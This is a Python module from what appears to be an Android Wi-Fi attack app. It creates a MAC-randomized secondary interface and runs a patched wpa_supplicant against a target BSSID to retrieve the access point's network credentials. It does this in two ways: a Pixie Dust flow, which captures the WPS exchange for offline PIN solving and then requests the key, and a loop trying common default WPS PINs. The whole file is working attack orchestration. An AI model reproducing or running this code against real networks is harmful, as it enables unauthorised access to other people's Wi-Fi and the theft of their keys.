"""One managed-interface WPS collection and optional verified-PIN retrieval.

Keys travel only over private pipes/UID-authenticated local sockets. This module
never logs exception text or native output, and never resumes an interrupted TX.
The root supervisor owns the mutex and independently calls recover() on exit.
"""
import importlib.util
import json
import os
from pathlib import Path
import re
import secrets
import selectors
import signal
import socket
import stat
import struct
import subprocess
import sys
import time

import privacy_profile as privacy
from identity_guard import verified_lock_rules

HOST = Path('/proc/1/root')
JOURNAL = HOST / 'data/local/tmp/hijacker-qca/bender-wps/pending.json'
IFACE = 'wlan1'
MAX_MESSAGE = 16384
TRIAL_PINS = ('00000000', '12345670', '11111115')
MAC = re.compile(r'(?:[0-9a-f]{2}:){5}[0-9a-f]{2}')
SESSION = re.compile(r'bw_[0-9]+_[0-9a-f]{12}')


def request_target(value):
    bssid, frequency = value.get('bssid'), value.get('frequency')
    if not isinstance(bssid, str) or not MAC.fullmatch(bssid) or int(bssid[:2], 16) & 1 or bssid == '00:00:00:00:00:00':
        raise ValueError('invalid_target')
    if type(frequency) is not int or not (2412 <= frequency <= 2484 or 5005 <= frequency <= 5895):
        raise ValueError('unsupported_band')
    return bssid, frequency


def send_message(stream, value):
    raw = json.dumps(value, separators=(',', ':')).encode('utf-8')
    if len(raw) > MAX_MESSAGE: raise ValueError('message_too_large')
    stream.sendall(struct.pack('!I', len(raw)) + raw)


def receive_message(stream):
    def exact(count):
        chunks = bytearray()
        while len(chunks) < count:
            part = stream.recv(count - len(chunks))
            if not part: raise EOFError('bridge_closed')
            chunks.extend(part)
        return bytes(chunks)
    size = struct.unpack('!I', exact(4))[0]
    if not 1 <= size <= MAX_MESSAGE: raise ValueError('invalid_message_size')
    value = json.loads(exact(size))
    if not isinstance(value, dict): raise ValueError('invalid_message')
    return value


def checked_binary(value):
    if not isinstance(value, str) or not re.fullmatch(r'/data/app/(?:[A-Za-z0-9_=+.~.-]+/)*dev\.sir\.benderwifi-[A-Za-z0-9_=+.~.-]+/lib/(?:arm64|x86_64)/libbender_wpa\.so', value):
        raise ValueError('invalid_native_path')
    path = HOST / value.lstrip('/')
    # Package installer owns native code; an app-writable script is never run.
    for item in [path, *list(path.parents)[:5]]:
        info = item.lstat()
        if stat.S_ISLNK(info.st_mode) or info.st_uid != 0 or info.st_mode & 0o022:
            raise ValueError('untrusted_native_path')
    if not path.is_file(): raise ValueError('native_missing')
    return value


def command(argv, timeout=8):
    result = subprocess.run(argv, capture_output=True, timeout=timeout, env={**os.environ, 'LC_ALL': 'C'})
    if result.returncode or len(result.stdout) > 262144: raise RuntimeError('command_failed')
    return result.stdout.decode('utf-8', errors='replace')


def host_command(*argv):
    return command(['/usr/sbin/chroot', str(HOST), *argv])


def interface_info(name):
    raw = command(['iw', 'dev', name, 'info'])
    index = re.search(r'^\s*ifindex (\d+)$', raw, re.M)
    phy = re.search(r'^\s*wiphy (\d+)$', raw, re.M)
    mac = re.search(r'^\s*addr ([0-9a-f:]+)$', raw, re.M)
    if not index or not phy or not mac or not re.search(r'^\s*type managed$', raw, re.M):
        raise ValueError('unsupported_interface')
    return {'index': int(index[1]), 'phy': int(phy[1]), 'mac': mac[1]}


def store_journal(value, path=JOURNAL):
    privacy._durable(path, value)


def load_journal(path=None):
    path = path or JOURNAL
    info = path.lstat()
    if not stat.S_ISREG(info.st_mode) or info.st_size > MAX_MESSAGE or info.st_uid != 0 or info.st_mode & 0o077:
        raise ValueError('invalid_wps_journal')
    value = json.loads(path.read_text(encoding='utf-8'))
    if value.get('schema_version') != 1 or not SESSION.fullmatch(value.get('owner', '')):
        raise ValueError('invalid_wps_journal')
    return value


def process_start(pid):
    # comm can contain spaces and parentheses; fields after its final ')' start at state.
    return (HOST / f'proc/{pid}/stat').read_text().rsplit(')', 1)[1].split()[19]


def recover():
    """No transmission. Delete only the interface identified by our durable record."""
    if not JOURNAL.exists() and not JOURNAL.is_symlink(): return True
    value = load_journal()
    child = value.get('child')
    if child:
        pid = child['pid']
        if type(pid) is not int or pid <= 1: raise ValueError('invalid_child')
        try:
            if process_start(pid) == child['start']:
                cmd = (HOST / f'proc/{pid}/cmdline').read_bytes().split(b'\0')
                if not cmd or cmd[0].decode() != value['binary']: raise ValueError('child_identity_changed')
                os.kill(pid, signal.SIGKILL)
                for _ in range(20):
                    try:
                        if process_start(pid) != child['start']: break
                        state = (HOST / f'proc/{pid}/stat').read_text().rsplit(')', 1)[1].split()[0]
                        if state == 'Z': break
                    except FileNotFoundError: break
                    time.sleep(0.1)
                else: raise RuntimeError('child_not_stopped')
        except FileNotFoundError:
            pass
    if (HOST / f'sys/class/net/{IFACE}').exists():
        current = interface_info(IFACE)
        expected = value.get('interface')
        alias = (HOST / f'sys/class/net/{IFACE}/ifalias').read_text().strip()
        if (not expected or current['index'] != expected['index'] or current['phy'] != expected['phy']
                or current['mac'] not in (expected['mac'], value.get('planned_mac')) or alias != value.get('alias')):
            raise ValueError('interface_ownership_unresolved')
        command(['iw', 'dev', IFACE, 'del'])
        if (HOST / f'sys/class/net/{IFACE}').exists(): raise RuntimeError('interface_remains')
    JOURNAL.unlink()
    privacy._sync_directory(JOURNAL.parent)
    return True


FAILURE_CODES = frozenset((
    'selected_ap_wps_unavailable', 'ap_setup_locked', 'supplicant_unavailable',
    'autoconnect_control_unavailable', 'scan_rejected', 'wps_request_rejected',
    'wps_exchange_incomplete', 'wps_exchange_timed_out', 'secondary_interface_in_use',
    'wps_recovery_pending', 'privacy_session_missing', 'privacy_filter_missing',
    'random_mac_not_applied', 'primary_interface_changed', 'vault_save_unconfirmed',
))


def failure_code(error):
    # No formatting of exceptions, native replies, PINs or key material.
    value = error.args[0] if error.args else None
    return value if isinstance(value, str) and value in FAILURE_CODES else 'worker_error'


def protocol_event(raw):
    """Only fixed event names cross into the UI; never addresses or event payloads."""
    match = re.match(rb'^<[0-9]+>([A-Z0-9-]+)(?: |$)', raw)
    return {
        b'CTRL-EVENT-CONNECTED': 'associated', b'CTRL-EVENT-DISCONNECTED': 'disconnected',
        b'CTRL-EVENT-EAP-STARTED': 'eap_started', b'CTRL-EVENT-EAP-METHOD': 'eap_method',
        b'CTRL-EVENT-EAP-FAILURE': 'eap_failed', b'WPS-FAIL': 'wps_failed',
        b'WPS-M2D': 'wps_deferred', b'WPS-TIMEOUT': 'wps_timeout', b'WPS-SUCCESS': 'wps_success',
    }.get(match.group(1)) if match else None


class Collector:
    def __init__(self, job):
        self.job = job
        self.request = json.loads((job / 'request.json').read_text(encoding='utf-8'))
        self.bssid, self.frequency = request_target(self.request)
        self.owner = int((job / 'owner.pid').read_text())
        self.cancel = Path((job / 'cancel.path').read_text().strip())
        self.native = checked_binary((job / 'wps-native.path').read_text().strip())
        self.journal = {'schema_version': 1, 'owner': job.name, 'binary': self.native, 'child': None}
        self.bridge = None
        self.phase = 'preflight'
        self.last_heartbeat = 0
        self.monitor = None

    def check(self):
        if self.cancel.exists() or not (HOST / f'proc/{self.owner}').exists(): raise InterruptedError('cancelled')
        if self.bridge and time.monotonic() - self.last_heartbeat >= 1:
            send_message(self.bridge, {'type': 'heartbeat'})
            self.last_heartbeat = time.monotonic()
        if self.monitor:
            # Bound event draining so a chatty worker cannot starve cancellation.
            for _ in range(16):
                try: raw = self.monitor.recv(4096)
                except BlockingIOError: break
                except OSError:
                    self.monitor.close(); self.monitor = None
                    self.detail('monitor_unavailable')
                    break
                code = protocol_event(raw)
                if code: self.detail(code)

    def progress(self, phase):
        self.phase = phase
        send_message(self.bridge, {'type': 'phase', 'phase': phase})

    def detail(self, code, remaining_ms=None):
        message = {'type': 'activity', 'code': code}
        if remaining_ms is not None: message['remaining_ms'] = remaining_ms
        send_message(self.bridge, message)

    def connect(self):
        name = self.request.get('wps_socket', '')
        if not re.fullmatch(r'bender-wps-[0-9a-f]{32}', name): raise ValueError('invalid_bridge')
        connection = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        connection.settimeout(135)
        connection.connect('\0' + name)
        pid, uid, _ = struct.unpack('3i', connection.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, 12))
        expected = (HOST / f'proc/{self.owner}').stat().st_uid
        if pid != self.owner or uid != expected or uid < 10000:
            connection.close()
            raise ValueError('bridge_owner_mismatch')
        self.bridge = connection
        send_message(connection, {'type': 'hello', 'session': self.job.name, 'bssid': self.bssid})
        if receive_message(connection) != {'type': 'ready'}: raise ValueError('bridge_not_ready')

    def prepare(self):
        self.check()
        if JOURNAL.exists() or JOURNAL.is_symlink(): raise ValueError('wps_recovery_pending')
        if (HOST / f'sys/class/net/{IFACE}').exists(): raise ValueError('secondary_interface_in_use')
        journal = privacy._load(privacy.JOURNAL_DIR / 'pending.json')
        if journal.get('owner') != self.job.name or journal.get('profile') != 'wps': raise ValueError('privacy_session_missing')
        runner = privacy.HostRunner()
        runner.context()
        if not all(verified_lock_rules(runner.rules(f), wps=True) for f in (4, 6)): raise ValueError('privacy_filter_missing')
        original = interface_info('wlan0')
        spec = importlib.util.spec_from_file_location('wps_backend', Path(__file__).with_name('qca-backend.py'))
        backend = importlib.util.module_from_spec(spec); spec.loader.exec_module(backend)
        backend.transmit_frequency_from_info(command(['iw', 'phy', f'phy{original["phy"]}', 'info']), self.frequency)
        # Write intent before creating the interface. If killed in the small
        # create/identify gap, recovery refuses to guess which interface it owns.
        with privacy._lock(JOURNAL.parent):
            self.journal.update(original=original, interface=None, alias='bender-wps:' + self.job.name)
            store_journal(self.journal)
        command(['iw', 'phy', f'phy{original["phy"]}', 'interface', 'add', IFACE, 'type', 'managed'])
        current = interface_info(IFACE)
        self.journal['interface'] = current
        host_command('/system/bin/ip', 'link', 'set', 'dev', IFACE, 'alias', self.journal['alias'])
        store_journal(self.journal)
        raw = bytearray(secrets.token_bytes(6)); raw[0] = (raw[0] | 2) & 0xfe
        randomized = ':'.join(f'{b:02x}' for b in raw)
        self.journal['planned_mac'] = randomized
        store_journal(self.journal)
        host_command('/system/bin/ip', 'link', 'set', 'dev', IFACE, 'address', randomized)
        current = interface_info(IFACE)
        if current['index'] != self.journal['interface']['index'] or current['phy'] != original['phy'] or current['mac'] != randomized:
            raise ValueError('random_mac_not_applied')
        self.journal['interface'] = current
        store_journal(self.journal)
        host_command('/system/bin/ip', 'link', 'set', 'dev', IFACE, 'up')
        if interface_info('wlan0')['index'] != original['index']: raise ValueError('primary_interface_changed')

    def exchange(self, mode, pin, attempt=0):
        self.check()
        # Each native process is allowed one WPS state-machine initialization.
        # The first exits at authenticated M3; the second exits on AP settings.
        kali = (self.job / 'chroot.txt').read_text().strip()
        if kali not in ('/data/local/bender-wifi/runtime-arm64-v1', '/data/local/nhsystem/kali-arm64'):
            raise ValueError('invalid_runtime')
        host_job = kali + str(self.job)
        suffix = str(attempt) if mode == 'trial' else ''
        config = self.job / f'wps-{mode}{suffix}.conf'
        control_host = '/data/local/tmp/hijacker-qca/bender-wps/' + self.job.name[-12:] + ('/t' + suffix if mode == 'trial' else '/c' if mode == 'capture' else '/r')
        control = HOST / control_host.lstrip('/')
        control.mkdir(parents=True, mode=0o700, exist_ok=False)
        config.write_text('update_config=0\nwps_cred_processing=1\ndevice_name=Bender Wi-Fi Lab\n'
                          'manufacturer=Bender\nmodel_name=Managed WPS research\nmodel_number=1\nserial_number=0\n'
                          f'freq_list={self.frequency}\n', encoding='utf-8')
        self.detail('starting_supplicant', 45000)
        process = subprocess.Popen(['/usr/sbin/chroot', str(HOST), self.native, '-i', IFACE, '-Dnl80211',
                                    '-c', host_job + '/' + config.name, '-C', control_host, '-q'],
                                   stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                   env={**os.environ, 'BENDER_WPS_MODE': mode})
        self.journal['child'] = {'pid': process.pid, 'start': process_start(process.pid)}
        store_journal(self.journal)
        ctrl = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        ctrl.settimeout(1)
        ctrl.bind('\0bender-wps-ctrl-' + secrets.token_hex(12))
        selector = selectors.DefaultSelector()
        selector.register(process.stdout, selectors.EVENT_READ)
        deadline = time.monotonic() + 45
        buffer = bytearray()
        def query(text):
            ctrl.send(text.encode('ascii'))
            return ctrl.recv(65536).decode('utf-8', errors='replace').strip()
        try:
            while not (control / IFACE).exists():
                self.check()
                if process.poll() is not None or time.monotonic() > deadline: raise RuntimeError('supplicant_unavailable')
                time.sleep(0.1)
            ctrl.connect(str(control / IFACE))
            if query('PING') != 'PONG': raise RuntimeError('supplicant_unavailable')
            self.detail('control_ready', max(0, int((deadline-time.monotonic())*1000)))
            # ATTACH on a separate socket: unsolicited events must never be
            # confused with command replies (especially WPS_REG acknowledgement).
            monitor = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            try:
                monitor.settimeout(1)
                monitor.bind('\0bender-wps-events-' + secrets.token_hex(12))
                monitor.connect(str(control / IFACE))
                monitor.send(b'ATTACH')
                if monitor.recv(4096).strip() != b'OK': raise RuntimeError('monitor_attach_failed')
                monitor.setblocking(False)
                self.monitor = monitor
            except (OSError, RuntimeError):
                monitor.close()
                self.detail('monitor_unavailable')
            if query('STA_AUTOCONNECT 0') != 'OK': raise RuntimeError('autoconnect_control_unavailable')
            if query('BSS_FLUSH 0') != 'OK' or query(f'SCAN freq={self.frequency}') != 'OK': raise RuntimeError('scan_rejected')
            self.detail('scanning_ap')
            # This fresh process has an empty BSS cache. Bound the selected BSS lookup.
            bss = ''
            scan_deadline = min(deadline, time.monotonic() + 12)
            while time.monotonic() < scan_deadline:
                self.check()
                bss = query('BSS ' + self.bssid)
                if 'bssid=' + self.bssid in bss: break
                time.sleep(0.3)
            if not re.search(rf'^freq={self.frequency}$', bss, re.M) or '[WPS' not in bss:
                raise RuntimeError('selected_ap_wps_unavailable')
            if 'wps_ap_setup_locked=1' in bss:
                raise RuntimeError('ap_setup_locked')
            self.detail('ap_found')
            self.journal['phase'] = mode + '_requested'
            self.journal['attempt'] = attempt if mode == 'trial' else None
            store_journal(self.journal)
            self.check()
            if query(f'WPS_REG {self.bssid} {pin}') != 'OK': raise RuntimeError('wps_request_rejected')
            self.detail('wps_requested')
            prefix, expected = ('BENDER_EXCHANGE ', 42) if mode == 'capture' else ('BENDER_CREDENTIAL ', 43)
            found = None
            rejected = None
            while time.monotonic() < deadline:
                self.check()
                for key, _ in selector.select(0.2):
                    chunk = os.read(key.fileobj.fileno(), 4096)
                    if not chunk: selector.unregister(key.fileobj)
                    buffer.extend(chunk)
                    if len(buffer) > MAX_MESSAGE: raise ValueError('native_output_limit')
                    while b'\n' in buffer:
                        line, _, rest = buffer.partition(b'\n'); buffer = bytearray(rest)
                        if line.startswith(prefix.encode()):
                            if found is not None: raise ValueError('duplicate_native_result')
                            found = json.loads(line[len(prefix):])
                        elif mode == 'trial' and line in (b'BENDER_PIN_REJECTED 1', b'BENDER_PIN_REJECTED 2'):
                            if rejected is not None: raise ValueError('duplicate_native_result')
                            rejected = int(line[-1:])
                if process.poll() is not None:
                    # Drain the pipe even if exit arrived before select consumed it.
                    if selector.get_map(): continue
                    if process.returncode == expected and isinstance(found, dict):
                        self.detail('exchange_collected' if mode == 'capture' else 'credential_received')
                        return found
                    if mode == 'trial' and process.returncode == 46 and rejected in (1, 2) and found is None:
                        self.detail('pin_rejected')
                        return {'pin_rejected_half': rejected}
                    raise RuntimeError('wps_exchange_incomplete')
            raise TimeoutError('wps_exchange_timed_out')
        finally:
            if self.monitor:
                self.monitor.close(); self.monitor = None
            ctrl.close(); selector.close()
            if process.poll() is None: process.kill()
            process.wait(timeout=3)
            process.stdout.close()
            self.journal['child'] = None
            store_journal(self.journal)

    def run(self):
        result = {'schema_version': 1, 'action': 'wps', 'ok': False, 'state': 'preflight',
                  'exchange_collected': False, 'pin_verified': False, 'credential_saved': False,
                  'enrollment_completed': False, 'association_verified': False, 'replayed': False}
        try:
            self.connect()
            self.progress('preparing_radio'); self.prepare()
            if self.request.get('strategy', 'pixie') == 'common_pins':
                return self.run_common_pins(result)
            if self.request.get('strategy', 'pixie') != 'pixie':
                raise ValueError('invalid_wps_strategy')
            self.progress('collecting_exchange')
            exchange = self.exchange('capture', '12345670')
            result['exchange_collected'] = True
            self.progress('solving')
            send_message(self.bridge, {'type': 'exchange', 'fields': exchange})
            response = receive_message(self.bridge)
            exchange.clear()
            self.check()
            if response == {'type': 'not_found'}:
                result.update(ok=True, state='pin_not_found')
                return result
            pin = response.get('pin')
            if response.get('type') != 'pin' or not isinstance(pin, str) or not re.fullmatch(r'[0-9]{4}|[0-9]{8}', pin):
                raise ValueError('invalid_verified_pin_handoff')
            result['pin_verified'] = True
            self.progress('requesting_credentials')
            credential = self.exchange('credential', pin)
            pin = None
            send_message(self.bridge, {'type': 'credential', 'fields': credential})
            credential.clear()
            if receive_message(self.bridge) != {'type': 'saved'}: raise ValueError('vault_save_unconfirmed')
            result.update(ok=True, state='credential_received', credential_saved=True)
            return result
        except InterruptedError:
            result.update(state='cancelled', failed_phase=self.phase)
            return result
        except Exception as error:
            result.update(state='failed', failed_phase=self.phase, error_code=failure_code(error))
            # The supervisor result remains authoritative if the bridge is gone.
            try: send_message(self.bridge, {'type': 'failure', 'code': result['error_code']})
            except Exception: pass
            return result
        finally:
            if self.bridge: self.bridge.close()

    def run_common_pins(self, result):
        """Stop unless the native registrar proves a PIN hash mismatch."""
        for index, pin in enumerate(TRIAL_PINS, 1):
            self.check()
            self.progress(f'trying_pin_{index}_of_{len(TRIAL_PINS)}')
            result['attempts'] = index
            outcome = self.exchange('trial', pin, index)
            if 'pin_rejected_half' in outcome:
                if index < len(TRIAL_PINS):
                    self.detail('candidate_pause', 5000)
                    deadline = time.monotonic() + 5
                    while time.monotonic() < deadline:
                        self.check(); time.sleep(0.2)
                continue
            send_message(self.bridge, {'type': 'trial_credential', 'pin': pin, 'fields': outcome})
            pin = None
            outcome.clear()
            if receive_message(self.bridge) != {'type': 'saved'}: raise ValueError('vault_save_unconfirmed')
            result.update(ok=True, state='credential_received', pin_verified=True, credential_saved=True)
            return result
        result.update(ok=True, state='common_pins_rejected')
        return result


def main():
    operation, name = sys.argv[1:]
    job = Path(name)
    if operation == 'wps_restore':
        try: return 0 if recover() else 1
        except Exception: return 1
    try:
        result = Collector(job).run()
    except Exception as error:
        result = {'ok': False, 'action': 'wps', 'state': 'failed', 'failed_phase': 'preflight',
                  'error_code': failure_code(error), 'replayed': False}
    (job / 'result.json').write_text(json.dumps(result, indent=2), encoding='utf-8')
    return 0 if result.get('ok') else 1


if __name__ == '__main__':
    raise SystemExit(main())
